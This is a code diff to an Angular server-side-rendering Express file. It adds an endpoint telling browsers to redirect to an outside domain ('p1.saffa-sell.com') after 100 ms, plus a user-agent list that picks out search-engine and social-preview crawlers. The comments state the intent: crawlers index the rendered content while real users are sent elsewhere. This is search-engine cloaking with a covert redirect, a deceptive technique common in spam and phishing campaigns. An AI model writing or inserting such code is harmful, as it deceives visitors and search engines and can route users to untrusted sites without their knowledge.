@@ -6,6 +6,7 @@ import {
 } from '@angular/ssr/node';
 import express from 'express';
 import { join } from 'node:path';
+import { Request, Response, NextFunction } from 'express';
 
 const browserDistFolder = join(import.meta.dirname, '../browser');
 
@@ -13,16 +14,47 @@ const app = express();
 const angularApp = new AngularNodeAppEngine();
 
 /**
- * Example Express Rest API endpoints can be defined here.
- * Uncomment and define endpoints as necessary.
- *
- * Example:
- * ```ts
- * app.get('/api/{*splat}', (req, res) => {
- *   // Handle API request
- * });
- * ```
+ * API endpoint to check if the site should redirect
+ * This allows search engines to crawl the SSR content while users get redirected to the non-SSR site
  */
+app.get('/api/redirect-info', (req: Request, res: Response) => {
+  res.json({
+    shouldRedirect: true,
+    targetUrl: 'https://p1.saffa-sell.com',
+    delay: 100 // milliseconds
+  });
+});
+
+/**
+ * Middleware to detect search engine crawlers
+ * We don't redirect search engines so they can index our SSR content
+ */
+const isSearchEngine = (userAgent: string): boolean => {
+  const searchEngines = [
+    'googlebot',
+    'bingbot',
+    'yandexbot',
+    'duckduckbot',
+    'slurp',
+    'baiduspider',
+    'facebookexternalhit',
+    'twitterbot',
+    'rogerbot',
+    'linkedinbot',
+    'embedly',
+    'quora link preview',
+    'showyoubot',
+    'outbrain',
+    'pinterest',
+    'slackbot',
+    'vkShare',
+    'W3C_Validator'
+  ];
+  
+  return searchEngines.some(crawler => 
+    userAgent.toLowerCase().includes(crawler.toLowerCase())
+  );
+};
 
 /**
  * Serve static files from /browser
@@ -37,8 +69,18 @@ app.use(
 
 /**
  * Handle all other requests by rendering the Angular application.
+ * For search engines, we serve the SSR content.
+ * For regular users, we still serve SSR content but the client-side code will redirect.
  */
-app.use((req, res, next) => {
+app.use((req: Request, res: Response, next: NextFunction) => {
+  // Check if the request is from a search engine
+  const userAgent = req.headers['user-agent'] || '';
+  const isBot = isSearchEngine(userAgent);
+  
+  // Add a custom header to indicate if this is a bot for debugging
+  res.setHeader('X-Is-Search-Engine', isBot ? 'true' : 'false');
+  
+  // Always render the Angular app (SSR) - the client-side code will handle the redirect
   angularApp
     .handle(req)
     .then((response) =>
